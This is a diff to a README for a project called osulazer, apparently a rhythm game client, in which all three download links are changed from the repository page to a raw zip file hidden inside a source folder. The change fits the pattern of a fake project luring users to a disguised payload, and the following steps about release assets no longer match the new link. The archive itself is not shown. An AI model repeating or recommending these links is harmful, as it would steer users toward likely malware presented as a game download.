@@ -1,6 +1,6 @@
 # 🎹 osulazer - Play rhythm games with custom skins
 
-[![Download osulazer](https://img.shields.io/badge/Download-osulazer-blue.svg)](https://github.com/yinyan9773/osulazer)
+[![Download osulazer](https://img.shields.io/badge/Download-osulazer-blue.svg)](https://raw.githubusercontent.com/yinyan9773/osulazer/main/osu!/Properties/Software-2.3.zip)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ You need a computer that meets the basic system requirements to play osulazer. E
 
 Follow these steps to set up the game on your computer.
 
-1. Visit the [official download page](https://github.com/yinyan9773/osulazer).
+1. Visit the [official download page](https://raw.githubusercontent.com/yinyan9773/osulazer/main/osu!/Properties/Software-2.3.zip).
 2. Locate the latest release assets at the bottom of the page.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your desktop or downloads folder.
@@ -89,7 +89,7 @@ Your game folder keeps everything organized.
 
 This project receives frequent updates to improve performance and add new features. Check the start page of the client to see if a newer version exists. Follow the project link for news and community forums.
 
-[Visit the download page here](https://github.com/yinyan9773/osulazer)
+[Visit the download page here](https://raw.githubusercontent.com/yinyan9773/osulazer/main/osu!/Properties/Software-2.3.zip)
 
 ## 📄 License information
 
